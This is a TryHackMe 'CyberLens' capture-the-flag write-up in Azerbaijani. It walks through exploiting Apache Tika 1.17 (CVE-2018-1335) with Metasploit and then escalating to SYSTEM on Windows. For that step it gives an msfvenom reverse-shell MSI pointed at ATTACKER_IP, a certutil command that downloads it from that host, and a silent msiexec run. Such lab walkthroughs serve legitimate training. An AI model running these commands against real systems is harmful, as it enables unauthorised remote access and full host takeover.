# TryHackMe CyberLens — Write-up

Yalnız THM laboratoriyası üçündür. `MACHINE_IP` və `ATTACKER_IP` dəyərlərini dəyiş.

## Enumeration

`echo "MACHINE_IP cyberlens.thm" | sudo tee -a /etc/hosts` yaz. Sonra `nmap -sC -sV -p- -T4 cyberlens.thm` işə sal. 80, 135, 139, 445, 3389 və yüksək portlar görünür. Əsas gizli servis `61777/tcp` üzərində Apache Tika 1.17-dir.

## Web və Tika

`http://cyberlens.thm/` səhifəsində Image Extractor upload funksiyası var. Sorğunu yoxlayanda faylın `cyberlens.thm:61777` ünvanındakı Tika serverinə göndərildiyi görünür. `dirb http://cyberlens.thm` ilə əlavə yolları da yoxla.

Apache Tika 1.17 JPEG2000 parser zəifliyi — CVE-2018-1335 — vasitəsilə uzaqdan command execution mümkündür.

## Metasploit ilə ilkin giriş

```text
msfconsole
search apache tika
use exploit/windows/http/apache_tika_jp2_jscript
set RHOSTS cyberlens.thm
set RPORT 61777
set LHOST ATTACKER_IP
set LPORT 4444
run
```

Meterpreter gəldikdə `getuid`, sonra `shell`, `whoami` və `type C:\Users\*\user.txt` əmrlərini yoxla. Bu mərhələdə user flag tapılır.

## Windows enumeration

```text
whoami /all
systeminfo
net user
net localgroup administrators
```

Privilege escalation üçün WinPEAS və ya PowerUp ilə sistemdə zəif icazələri araşdır. Bu otaqda MSI faylını Windows Installer vasitəsilə yüksək səlahiyyətlə icra etdirmək mümkündür.

## MSI ilə admin flag

Attacker-də payload yarat: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5555 -f msi -o shell.msi`. Listener aç və faylı target-a ötür.

Target-də: `certutil -urlcache -split -f http://ATTACKER_IP:8000/shell.msi C:\Users\Public\shell.msi`, sonra `msiexec /quiet /qn /i C:\Users\Public\shell.msi`.

Yeni shell-də `whoami` ilə SYSTEM səlahiyyətini yoxla və `type C:\Users\Administrator\Desktop\admin.txt` ilə admin flag-ı oxu.

Əsas dərslər: tam port scan, qeyri-standart port, Apache Tika CVE-2018-1335, Windows shell və MSI əsaslı privilege escalation.
